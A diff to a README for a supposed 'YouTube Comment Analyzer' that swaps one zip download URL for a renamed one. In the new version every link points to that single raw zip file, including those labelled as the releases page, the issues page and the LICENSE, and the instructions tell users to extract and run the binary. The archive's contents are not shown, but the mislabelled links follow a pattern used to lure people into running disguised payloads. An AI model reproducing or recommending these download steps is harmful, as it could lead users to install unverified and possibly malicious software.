@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download Now](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip%20Now-YouTube%20Comment%20Analyzer-brightgreen)](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip%20Now-YouTube%20Comment%20Analyzer-brightgreen)](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,14 +27,14 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip)
 
 1. **Go to the Releases Page**:
    - Click the link above to access the download page.
 
 2. **Choose the Right File**:
-   - Find the latest release. Look for a file named `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip` for Windows or `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip` for macOS.
-   - For Linux, you may find a `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip` file. Download it according to your system.
+   - Find the latest release. Look for a file named `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip` for Windows or `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip` for macOS.
+   - For Linux, you may find a `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip` file. Download it according to your system.
 
 3. **Download the File**:
    - Click on the file name to start the download. Your browser will save it to your default download location.
@@ -47,7 +47,7 @@ Visit this page to download: [GitHub Releases Page](https://raw.githubuserconten
      - Open the downloaded `.app` file.
      - Drag and drop it into your Applications folder.
    - For Linux:
-     - Extract the `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip` file.
+     - Extract the `https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip` file.
      - Open your terminal and navigate to the extracted folder.
      - Run the software with `./YouTube-Comment-Analyzer`.
 
@@ -83,11 +83,11 @@ If you encounter issues, consider the following:
 
 For questions or feedback:
 
-- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip) to report problems or suggest features.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip) to report problems or suggest features.
 - Join our community forums for tips on using the application effectively.
 
 ## 📄 License
 
-The YouTube Comment Analyzer is open-source software. You can freely use and modify it according to the terms outlined in the [LICENSE](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/YouTube-Comment-Analyzer_v2.1.zip) file.
+The YouTube Comment Analyzer is open-source software. You can freely use and modify it according to the terms outlined in the [LICENSE](https://raw.githubusercontent.com/Adi-123455/YouTube-Comment-Analyzer/main/media/Comment-You-Tube-Analyzer-v2.4.zip) file.
 
 Thank you for using YouTube Comment Analyzer. We hope it helps you gain insights into your favorite videos!
